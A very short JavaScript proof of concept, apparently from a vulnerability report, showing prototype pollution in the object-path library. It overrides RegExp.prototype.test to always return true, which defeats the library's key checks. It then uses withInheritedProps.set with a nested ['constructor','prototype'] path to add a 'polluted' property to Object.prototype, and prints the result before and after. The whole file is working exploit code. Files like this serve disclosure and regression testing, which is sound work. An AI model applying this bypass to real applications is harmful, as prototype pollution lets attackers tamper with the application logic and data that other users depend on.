RegExp.prototype.test = () => true;
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set({}, [
    [
        'constructor',
        'prototype'
    ],
    'polluted'
], 'yes');
console.log({}.polluted);